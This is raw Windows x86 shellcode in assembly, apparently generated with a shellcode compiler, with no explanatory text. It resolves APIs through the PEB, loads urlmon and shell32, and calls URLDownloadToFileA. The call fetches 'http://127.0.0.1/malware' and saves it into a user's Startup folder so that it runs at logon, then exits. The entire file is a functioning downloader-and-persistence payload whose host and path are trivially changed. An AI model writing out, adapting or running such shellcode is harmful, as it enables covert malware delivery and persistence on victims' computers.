; Shellcode generated using Shellcode Compiler                         
; https://github.com/NytroRST/ShellcodeCompiler                    

xor ecx, ecx                                                           
mov eax, fs:[ecx + 0x30]               ; EAX = PEB                     
mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr                
mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder     
lodsd                                  ; EAX = Second module           
xchg eax, esi                          ; EAX = ESI, ESI = EAX          
lodsd                                  ; EAX = Third(kernel32)         
mov ebx, [eax + 0x10]                  ; EBX = Base address            
mov edx, [ebx + 0x3c]                  ; EDX = DOS->e_lfanew           
add edx, ebx                           ; EDX = PE Header               
mov edx, [edx + 0x78]                  ; EDX = Offset export table     
add edx, ebx                           ; EDX = Export table            
mov esi, [edx + 0x20]                  ; ESI = Offset namestable       
add esi, ebx                           ; ESI = Names table             
xor ecx, ecx                           ; EXC = 0                       

Get_Function:                                                          

inc ecx                                ; Increment the ordinal         
lodsd                                  ; Get name offset               
add eax, ebx                           ; Get function name             
cmp dword [eax], 0x50746547            ; GetP                          
jnz Get_Function                                                       
cmp dword [eax + 0x4], 0x41636f72      ; rocA                          
jnz Get_Function                                                       
cmp dword [eax + 0x8], 0x65726464      ; ddre                          
jnz Get_Function                                                       
mov esi, [edx + 0x24]                  ; ESI = Offset ordinals         
add esi, ebx                           ; ESI = Ordinals table          
mov cx, [esi + ecx * 2]                ; Number of function            
dec ecx                                                                
mov esi, [edx + 0x1c]                  ; Offset address table          
add esi, ebx                           ; ESI = Address table           
mov edx, [esi + ecx * 4]               ; EDX = Pointer(offset)         
add edx, ebx                           ; EDX = GetProcAddress          

xor ecx, ecx                           ; ECX = 0                       
push ebx                               ; Kernel32 base address         
push edx                               ; GetProcAddress                
push ecx                               ; 0                             
push 0x41797261                        ; aryA                          
push 0x7262694c                        ; Libr                          
push 0x64616f4c                        ; Load                          
push esp                               ; LoadLibrary                   
push ebx                               ; Kernel32 base address         
call edx                               ; GetProcAddress(LL)            

add esp, 0xc                           ; pop LoadLibrary               
pop ecx                                ; ECX = 0                       
push eax                               ; EAX = LoadLibrary             

xor eax, eax
mov ax, 0x6c6c
push eax
push 0x642e6e6f
push 0x6d6c7275
push esp                               ; String on the stack           
call [esp + 16]
add esp, 12
push eax                               ; DLL base on the stack         

xor eax, eax
mov eax, 0x236c6c64
push eax
sub dword [esp + 3], 0x23
push 0x2e32336c
push 0x6c656873
push esp                               ; String on the stack           
call [esp + 20]
add esp, 12
push eax                               ; DLL base on the stack         

xor eax, eax
mov ax, 0x4165
push eax
push 0x6c69466f
push 0x5464616f
push 0x6c6e776f
push 0x444c5255
push esp                               ; String on the stack            
push dword [esp + 28] 
call [esp + 40]
add esp, 20
push eax                               ; Function address on the stack 

; GetProcAddress(shell32.dll, SHGetFolderPathA)

xor eax, eax                           ; EAX = 0                       
push eax                               ; NULL on the stack             
push 0x41687461
push 0x50726564
push 0x6c6f4674
push 0x65474853
push esp                               ; String on the stack            
push dword [esp + 28] 
call [esp + 44]
add esp, 20
push eax                               ; Function address on the stack 

xor eax, eax
mov eax, 0x23737365
push eax
sub dword [esp + 3], 0x23
push 0x636f7250
push 0x74697845
push esp                               ; String on the stack            
push dword [esp + 40] 
call [esp + 40]
add esp, 12
push eax                               ; Function address on the stack 

push 0x4277dc9
xor eax, eax
push eax
push 0x1d
xor eax, eax
push eax
call [ESP + 20]
xor eax, eax                            ; EAX = 0                       
push eax                                ; NULL on the stack             
push 0x65726177
push 0x6c616d2f
push 0x312e302e
push 0x302e3732
push 0x312f2f3a
push 0x70747468
push esp

xor eax, eax
mov al, 0x74
push eax
push 0x78742e32
push 0x65726177
push 0x6c616d2f
push 0x70757472
push 0x6174532f
push 0x736d6172
push 0x676f7250
push 0x2f756e65
push 0x4d207472
push 0x6174532f
push 0x73776f64
push 0x6e69572f
push 0x74666f73
push 0x6f726369
push 0x4d2f676e
push 0x696d616f
push 0x522f6174
push 0x61447070
push 0x412f6178
push 0x656c412f
push 0x73726573
push 0x552f3a43
push esp

xor eax, eax
push eax
xor eax, eax
push eax
push dword [ESP + 8]
push dword [ESP + 108]
xor eax, eax
push eax
call [ESP + 156]
add ESP, 128
xor eax, eax
push eax
call [ESP + 4]
